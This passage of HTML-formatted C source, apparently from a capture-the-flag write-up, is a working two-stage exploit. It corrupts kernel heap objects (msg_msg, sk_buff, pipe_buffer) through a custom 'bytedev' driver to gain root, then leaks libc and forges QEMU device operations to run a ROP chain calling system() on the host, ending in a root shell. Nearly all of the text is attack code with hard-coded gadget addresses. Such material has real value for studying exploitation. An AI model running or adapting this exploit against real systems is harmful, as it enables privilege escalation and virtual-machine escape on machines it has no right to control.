class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff81e2d980</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810bb9c04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff8224aca0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810bb710</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff811af57d</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_MODE_CHANGE 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BLK_IDX_CHANGE 0x1919810</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_SYSTEM 0x50d60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RSP_RDX_RET 0x5a170</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_POP_RDI_RET 0x2a3e5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_RET 0x2a3e6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_BIN_SH 0x1d8698</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_PUTS 0x80ed0</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BYTEDEV_MODE</span> &#123;</span><br>    BYTEDEV_MODE_STREAM = <span class="hljs-number">0</span>,<br>    BYTEDEV_MODE_BLK,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>  &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; secondary_msg;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_second_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) \<br>                + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">int</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-type">int</span> socket_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">fake_data</span>;</span><br>    <span class="hljs-type">char</span> *trash_data;<br><br>    <span class="hljs-comment">/* free the first buffer in bytedev queue */</span><br>    trash_data = <span class="hljs-built_in">malloc</span>(BYTEDEV_BUF_SIZE);<br>    <span class="hljs-built_in">memset</span>(trash_data, <span class="hljs-number">0x84</span>, BYTEDEV_BUF_SIZE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write %ld bytes to dev \n&quot;</span>, <br>            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read %ld bytes from dev\n&quot;</span>, <br>            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br><br>    <span class="hljs-comment">/* construct fake bytedev_data */</span><br>    fake_data = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data) + BYTEDEV_BUF_SIZE);<br>    fake_data-&gt;len = BYTEDEV_BUF_SIZE + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] re-get the buffer by sk_buff...&quot;</span>);<br>    write(socket_fd[<span class="hljs-number">0</span>], fake_data, BYTEDEV_BUF_SIZE - <span class="hljs-number">320</span>);<br><br>    <span class="hljs-comment">/* make an OOB write */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB write to nearby object...&quot;</span>);<br>    write(dev_fd, trash_data, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* to prevent the memory leaking */</span><br>    <span class="hljs-built_in">free</span>(trash_data);<br>    <span class="hljs-built_in">free</span>(fake_data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemuEscape</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd, ret;<br>    <span class="hljs-type">uint64_t</span> buf[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> fake_ops[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> libc_base, opaque, byte_dev_pmio_read;<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SECTOR -23: container</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> in docker-built Ubuntu 22.04, we cannot leak libc there.</span><br><span class="hljs-comment">     *      [55] g_str_hash</span><br><span class="hljs-comment">     *      [56] g_str_equal</span><br><span class="hljs-comment">     * SECTOR -24: BYTEPCIDevState</span><br><span class="hljs-comment">     *      [27~34] name</span><br><span class="hljs-comment">     *      [35~] io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     * SECTOR -25: byte_dev_pmio_ops</span><br><span class="hljs-comment">     *      [0] byte_dev_pmio_read</span><br><span class="hljs-comment">     *      [1] byte_dev_pmio_write</span><br><span class="hljs-comment">     * SECTOR -355 &amp;io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     *      SECTOR -352 MemoryRegion - mmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     *      SECTOR -347 MemoryRegion - pmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     * SECTOR -388</span><br><span class="hljs-comment">     *      [8] &lt;g_str_hash&gt;</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I leak basic info</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I leak basic\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -388 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-388</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x7f0000000000</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>); i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--data-dump--][%d] %lx\n&quot;</span>, i, buf[i]);<br>        &#125;<br>        errExit(<span class="hljs-string">&quot;failed to leak libc related ptr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* This&#x27;s the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */</span><br>    libc_base = buf[<span class="hljs-number">7</span>] - <span class="hljs-number">0x3ea410</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n&quot;</span>, libc_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -25 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-25</span>);<br>    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);<br>    byte_dev_pmio_read = fake_ops[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n&quot;</span>, <br>            byte_dev_pmio_read);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -347 sector...\033[0m&quot;</span>);<br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>    opaque = buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got opaque: \033[0m%lx\n&quot;</span>, opaque);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II construct fake pmio-&gt;ops</span><br><span class="hljs-comment">     * There we make the opaque.parent_obj.name the ops,</span><br><span class="hljs-comment">     * so that nothing will be effects</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.II construct fake pmio-&gt;ops\033[0m&quot;</span>);<br>    <br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-24</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    buf[<span class="hljs-number">33</span>] = buf[<span class="hljs-number">34</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;buf[<span class="hljs-number">33</span>], <span class="hljs-string">&quot;ls;cat ./flag;gnome-calculator;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* the new rdx starts there */</span><br>    buf[<span class="hljs-number">28</span>] = libc_base + LIBC_POP_RDI_RET;<br>    buf[<span class="hljs-number">29</span>] = opaque + <span class="hljs-number">33</span> * <span class="hljs-number">8</span>;<span class="hljs-comment">//libc_base + LIBC_BIN_SH;</span><br>    buf[<span class="hljs-number">30</span>] = libc_base + LIBC_SYSTEM;<br>    <span class="hljs-comment">//buf[31] = </span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * [rdx + 20]</span><br><span class="hljs-comment">     * mov rsp, rdx ; ret</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">32</span>] = libc_base + LIBC_MOV_RSP_RDX_RET;<br><br>    <span class="hljs-comment">/* the [rdi + 8] */</span><br>    buf[<span class="hljs-number">1</span>] = opaque + <span class="hljs-number">28</span> * <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">/* fake ops on bar space */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        buf[<span class="hljs-number">50</span> + i] = fake_ops[i];<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * mov rdx, qword ptr [rdi + 8] ; -&gt; store the ptr in opaque[1]</span><br><span class="hljs-comment">     * mov qword ptr [rsp], rax ; </span><br><span class="hljs-comment">     * call qword ptr [rdx + 0x20]  -&gt; another call</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">51</span>] = <br>        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;<br><br>    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III change pmio-&gt;ops to fake ops on opaque</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III change pmio-&gt;ops to fake ops\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    buf[<span class="hljs-number">9</span>] = opaque + <span class="hljs-number">50</span> * <span class="hljs-number">8</span>;<br>    write(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV trigger fake pmio-&gt;ops.read to escape</span><br><span class="hljs-comment">     * There we need to set opaque[1] to opaque.parent_obj.name</span><br><span class="hljs-comment">     * and do something wonderful there...</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//sleep(5);</span><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid()) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n&quot;</span>);<br>    qemuEscape();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_socket[<span 